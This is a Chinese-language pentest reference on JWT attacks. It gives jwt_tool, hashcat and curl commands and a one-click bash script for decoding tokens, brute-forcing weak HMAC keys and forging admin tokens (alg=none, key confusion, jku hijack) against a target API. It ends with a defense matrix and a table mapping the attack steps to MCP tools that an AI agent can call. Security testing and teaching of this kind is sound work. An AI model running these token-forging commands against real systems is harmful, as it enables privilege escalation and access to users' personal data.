# JWT 工具链、攻击流程与防御矩阵

## 1. 完整工具链

### 核心工具

| 工具 | 用途 | 安装 |
|------|------|------|
| [jwt_tool.py](https://github.com/ticarpi/jwt_tool) | 全能：解码、扫描、伪造、爆破、重放 | `git clone && pip install -r requirements.txt` |
| [jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) | C 语言高速 HS 密钥爆破 | `make` |
| [hashcat](https://hashcat.net/hashcat/) | GPU 加速 HS 爆破 `-m 16500` | 系统包管理器 |
| [Burp JWT Editor](https://portswigger.net/bappstore/ae0b7ed2e1d94e51a114b92b74660e4f) | GUI JWT 编辑/重放 | BApp Store |
| [jwt.io](https://jwt.io/) | 在线调试、解码 | Web |
| [CyberChef](https://cyberchef.org/) | 本地 Base64/JWT 编解码 | Web / 离线版 |

### 辅助工具

| 工具 | 用途 |
|------|------|
| `openssl` | 生成 RSA/EC 密钥对、证书 |
| `cryptography` (Python) | JWK ↔ PEM 转换、算法验证 |
| `jq` | JWKS JSON 解析 |
| `curl` | HTTP 请求重放 |
| `Burp Repeater` | 修改 Header/Payload 并发包 |
| `ngrok` / `localtunnel` | 暴露本地 JWKS 用于 jku 测试 |

---

## 2. 标准攻击流程

### 阶段 1: 信息收集

```bash
# Step 1.1: 捕获合法 Token
# - 浏览器 DevTools: Application → Cookies / Local Storage
# - Burp Suite: Proxy → HTTP history → Authorization header
# - 移动端: 代理抓包

# Step 1.2: 解码分析
python3 jwt_tool.py <token>
# 输出:
#   Header:  {"alg": "RS256", "typ": "JWT", "kid": "key-001"}
#   Payload: {"sub": "12345", "role": "user", "exp": 1718123456, "iss": "auth.target.com"}

# Step 1.3: 信息收集
#   - 查看 /.well-known/jwks.json
#   - 查看 /.well-known/openid-configuration
#   - 指纹后端框架 (Server / X-Powered-By 头)
#   - 识别 JWT 库版本（从错误信息）
```

### 阶段 2: 漏洞扫描

```bash
# Step 2.1: 全自动 CVE 扫描
python3 jwt_tool.py <token> -t https://target.com/api/me -cv "Welcome" -M pb

# Step 2.2: 逐项测试
python3 jwt_tool.py <token> -X n                 # alg: none
python3 jwt_tool.py <token> -X k -pk public.pem  # key confusion
python3 jwt_tool.py <token> -X i                 # kid injection

# Step 2.3: 手动验证 Claim
python3 jwt_tool.py <token> -I \
  -pc "exp" -pv "9999999999" \
  -pc "role" -pv "admin" \
  -pc "sub" -pv "admin"

# Step 2.4: 无签名测试
# 直接解码→修改→重编码，不加签名
# 如果 200 → 签名未验证
```

### 阶段 3: 密钥获取

```bash
# 路径 A: 公钥收集 (用于算法混淆)
curl -s https://target.com/.well-known/jwks.json | jq .
curl -s https://target.com/.well-known/openid-configuration | jq .jwks_uri
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# 路径 B: 弱密钥爆破 (用于 HMAC)
hashcat -m 16500 jwt.txt rockyou.txt
python3 jwt_tool.py <token> -C -d rockyou.txt

# 路径 C: kid 注入获取密钥
# → 详见 jwt-kid-injection.md
```

### 阶段 4: Token 伪造

```bash
# 场景 A: 拿到 HMAC 密钥
python3 jwt_tool.py <token> -S hs256 -k "cracked_secret" \
  -I -pc "role" -pv "admin" -pc "sub" -pv "admin"

# 场景 B: 算法混淆 (用公钥做 HS256)
python3 jwt_tool.py <token> -S hs256 -k public.pem \
  -I -pc "role" -pv "admin"

# 场景 C: 自建 JWKS (jku 劫持)
python3 jwt_tool.py <token> -X i -pk attacker_private.pem

# 场景 D: alg=none
python3 jwt_tool.py <token> -X n -I -pc "role" -pv "admin"
```

### 阶段 5: 验证与利用

```bash
# 验证伪造的 Token
curl -v https://target.com/api/admin \
  -H "Authorization: Bearer <forged_token>"

# 如果是管理后台 Cookie:
curl -v https://target.com/admin/dashboard \
  -H "Cookie: jwt=<forged_token>"

# 批量测试
while read url; do
  echo "[*] Testing $url"
  curl -s -o /dev/null -w "%{http_code}" "$url" \
    -H "Authorization: Bearer $TOKEN"
  echo ""
done < endpoints.txt
```

---

## 3. 一键工作流脚本

```bash
#!/bin/bash
# jwt_attack_workflow.sh — JWT 攻击一键工作流
# Usage: ./jwt_attack_workflow.sh <token> <target_url>

TOKEN="$1"
TARGET="$2"
OUTDIR="jwt_attack_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

echo "[*] Phase 1: Decode"
python3 jwt_tool.py "$TOKEN" | tee "$OUTDIR/01_decode.txt"

echo "[*] Phase 2: Scan"
python3 jwt_tool.py "$TOKEN" -t "$TARGET" -M pb 2>&1 | tee "$OUTDIR/02_scan.txt"

echo "[*] Phase 3: alg=none"
python3 jwt_tool.py "$TOKEN" -X n 2>&1 | tee "$OUTDIR/03_alg_none.txt"

echo "[*] Phase 4: weak key brute"
python3 jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt 2>&1 | tee "$OUTDIR/04_brute.txt"

echo "[*] Phase 5: claim bypass"
python3 jwt_tool.py "$TOKEN" -I -pc "exp" -pv "9999999999" 2>&1 | tee "$OUTDIR/05_exp.txt"
python3 jwt_tool.py "$TOKEN" -I -pc "role" -pv "admin" 2>&1 | tee "$OUTDIR/05_role.txt"

echo "[*] Phase 6: check JWKS"
curl -s "$TARGET/.well-known/jwks.json" | tee "$OUTDIR/06_jwks.json"
curl -s "$TARGET/.well-known/openid-configuration" | tee "$OUTDIR/06_oidc.json"

echo "[*] Done. Results in $OUTDIR/"
```

---

## 4. 证据收集模板

每次测试必须记录：

```markdown
## JWT 测试证据

### 原始 Token
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0wMDEifQ...
```

### 解码结果
- Header:  `{"alg":"RS256","typ":"JWT","kid":"key-001"}`
- Payload: `{"sub":"12345","role":"user","exp":1718123456}`
- 签发者:  `auth.target.com`

### 测试记录

| # | 测试类型 | 修改项 | 发送的 Token (前50字符) | HTTP 状态 | 结果 |
|---|---------|--------|------------------------|-----------|------|
| 1 | alg:none | alg→none, role→admin | eyJhbGciOiJub25lIn0... | 200 | ✓ 绕过 |
| 2 | Claim | exp→9999999999 | ... | 200 | ✓ 未验证过期 |
| 3 | 弱密钥 | 未修改 (爆破) | ... | N/A | ✗ 密钥强度足够 |

### 成功攻击的完整请求
```http
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIn0...
```

### 成功攻击的响应
```json
{"users": [...], "admin_panel": true}
```

### 影响
- 权限提升：user → admin
- 可访问的管理接口：/api/admin/users, /api/admin/settings
- 可操作的数据：所有用户 PII

### 工具与命令
```bash
python3 jwt_tool.py <original> -X n -I -pc "role" -pv "admin"
```
```

---

## 5. 防御矩阵

### 服务端

| 层面 | 错误做法 | 正确做法 |
|------|---------|---------|
| **算法** | 信任 Header 中的 `alg` | 固定白名单：`["RS256"]` 或 `["ES256"]` |
| **none** | 未显式禁用 | `algorithms` 列表中不含 `none` |
| **密钥类型** | HS256（对称） | RS256/ES256（非对称），密钥不共享 |
| **HMAC 密钥** | 短密码、字典词 | 256-bit CSPRNG 随机值，存环境变量 |
| **公钥获取** | 信任 Header 的 `jku` / `x5u` | 从本地配置或白名单 URL 获取 |
| **kid** | 直接拼接到路径/查询/命令 | 仅做 key→value 映射查询 |
| **exp 验证** | 不检查 | 必须验证，且误差窗口 ≤ 5 min |
| **nbf 验证** | 不检查 | 必须验证 |
| **iss 验证** | 不检查 | 必须白名单匹配 |
| **aud 验证** | 不检查 | 必须匹配当前服务标识 |
| **typ 验证** | 不区分 Token 类型 | Access Token 不接受 ID Token |
| **jti 验证** | 不生成/不验证 | 生成唯一 jti，维护使用记录 |
| **撤销** | 无机制 | Redis 黑名单 + jti 检查 |
| **有效期** | > 24h | Access Token ≤ 15 min，Refresh Token 可更长 |
| **库版本** | 不更新 | 保持最新 stable，订阅安全公告 |

### 客户端（前端/移动端）

| 层面 | 错误做法 | 正确做法 |
|------|---------|---------|
| **存储** | `localStorage` / `sessionStorage` | `httpOnly` + `Secure` + `SameSite=Strict` Cookie |
| **传输** | URL 参数 | Authorization Header 或 Cookie |
| **HTTPS** | HTTP 明文 | 强制 HTTPS + HSTS |
| **Logout** | 仅前端删除 Token | 调服务端 `/revoke` 端点 |

### 传输与基础设施

| 层面 | 措施 |
|------|------|
| TLS | ≥ 1.2，禁用弱密码套件 |
| HSTS | `max-age=31536000; includeSubDomains; preload` |
| Referrer-Policy | `strict-origin` 或 `no-referrer` |
| CORS | 严格限制 Origin，不反射 `Access-Control-Allow-Origin` |
| 日志 | 不记录 Authorization header |
| WAF | 检测异常 JWT（alg:none、超长 exp 等） |

---

## 参考

- [RFC 8725: JWT Best Current Practices](https://www.rfc-editor.org/rfc/rfc8725.html)
- [OWASP: JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
- [jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
- [IANA JWT Claims Registry](https://www.iana.org/assignments/jwt/jwt.xhtml)

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 防御措施验证 | `http_probe` | HTTP GET 探测验证 JWT 防御配置 |
| jwt_tool 工具检查 | `ctf_tool_status` | 检查 CTF 工具安装状态 |
